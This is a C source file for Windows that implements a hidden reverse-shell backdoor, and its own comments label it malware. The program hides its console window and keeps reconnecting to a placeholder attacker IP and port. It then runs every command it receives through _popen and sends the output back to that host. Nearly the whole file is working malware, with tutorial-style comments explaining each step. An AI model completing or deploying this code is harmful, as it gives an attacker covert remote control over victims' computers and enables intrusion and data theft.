#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

void Shell()
{

	char buffer[1024];
	char container[1024];
	char total_response[18384];
	
	//Infinite loop
	while(1)
	{
		jump:
		//rest to all 0, we may use memset instead.
		bzero(buffer,1024);
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		//receive the bytes on socket object
		recv(sock, buffer, 1024, 0);


		//open file, as process -> use popen
		FILE *fp;
		//read buffer, and execute it
		fp = _popen(buffer, "r");
		//send response back to server
		//put fp(first 1024bytes) into container
		while(fgets(container, 1024,fp) != NULL)
		{
			strcat(total_response, container);
		}
		send(sock, total_response, sizeof(total_response), 0);
		fclose(fp);
	
	}

}

/*
Main function, 
Specifically use Apientry to access different functions.

hInstance : represent/handle instance for modules OS use this value to identify the executable when it is loaded on memory
hperv : all 0 for now. (16 bits)
lpCmdLine : argument such as unicode string
nCmdshow : flag that shows main application window 

*/
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
	//Hiding malware
	HWND stealth; //Hide our program even if this program is running
	AllocConsole(); //allocated new console to calling processe
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);

	//connection part	
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData; //data structure for informations about window socket

	//Important: use server's ip and port. 
	ServIP = "IP Here";
	ServPort = port here;
	
	//WSAStartup initiate use of Winsock DLL by a process, if returns 0, that measn successful.
	if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0) 
	{
		exit(1);
	}
	
	//create socket value with AF_INET(IPv4 internet protocol), Sock_stream(sequenced, two-way connction based byte stream).
	sock= socket(AF_INET, SOCK_STREAM,0);

	//clear ServAddr variables with 0's
	memset(&ServAddr, 0, sizeof(ServAddr));
	
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);

	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) 
	{
		Sleep(10);
	}
	Shell();

}
